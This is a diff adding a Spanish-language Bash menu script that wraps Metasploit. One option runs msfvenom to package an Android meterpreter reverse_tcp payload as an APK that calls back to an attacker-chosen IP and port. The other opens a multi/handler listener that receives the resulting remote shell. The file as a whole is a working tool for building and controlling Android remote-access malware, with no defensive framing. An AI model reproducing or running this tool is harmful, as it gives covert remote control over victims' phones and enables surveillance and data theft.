@@ -1,0 +1,114 @@
+#!/bin/bash
+
+#colors
+bold="\033[1m"
+blink="\033[5m"
+under="\033[4m"
+normal="\033[0m"
+green="\033[32m"
+red="\033[31m"
+blue="\033[34m"
+#normal variables
+Install_path="/root/Documents/pro/P3rl4_Manager/"
+Output_path="$Install_path/output/"
+
+
+
+
+
+#Generate Payload For android
+function MSGenerate() {
+
+
+	command -v msfconsole >/dev/null 2>&1 || { echo >&2 "I require Metasploit but it's not installed.  Aborting."; exit;  }
+	
+	
+
+	echo -e "$green |Escriba Su Ip"
+	read -p " |>" Lhost
+	echo -e "|Escriba El Puerto Que Desea Usar"
+	read -p " |>" Lport
+	msfvenom -p android/meterpreter/reverse_tcp LHOST=$Lhost LPORT=$Lport R > $Output_path/android.apk
+	
+	if [[ $? -eq 0 ]]; then
+		echo -e "$red El .apk Ha Sido Depositado En La Carpeta Output $normal"
+		sleep 1
+		main
+	else
+		clear
+		echo -e "$red Ha Habido Algun Error En La Generacion Del Payload $normal"
+		rm $Output_path/android.apk
+		sleep 2.5
+		main
+	fi
+
+
+
+	read
+}
+function MSListener() {
+
+
+	echo -e "$green |Escriba Su Ip"
+	read -p " |>" Lhost
+	echo -e "|Escriba El Puerto Que Desea Usar"
+	read -p " |>" Lport
+	clear
+	msfconsole << _EOF_
+
+		use multi/handler
+		set PAYLOAD android/meterpreter/reverse_tcp
+		set LHOST $Lhost
+		set LPORT $Lport
+		exploit
+_EOF_
+	if [[ $? -eq 0 ]]; then
+		main
+	else
+		clear
+		echo -e "$red Algo Ha Ido Mal $normal"
+		main
+	fi
+}	
+#main menu
+function main() {
+	while [[ $elec1 != 0 ]]; do
+		clear
+		echo -e "\n\n\n"
+		echo -e "$green 1) $red Generar Payload"
+		echo -e "$green 2) $red Abrir Listener"
+		echo -e "$green 3) $red Cancelar $normal"
+		echo -e "\n\n $green"
+		read -p "Eleccion > " elec1
+		echo -e "$normal"
+		case $elec1 in
+			
+			1)
+				MSGenerate
+				;;
+			2)
+				MSListener
+				;;
+			3)			
+				exit
+				;;
+			*)
+				clear
+				echo -e "$red Elige Una Opcion Valida $normal"
+				sleep 0.7
+				;;
+		esac
+	done
+}
+main
+
+
+
+
+
+
+
+
+
+
+
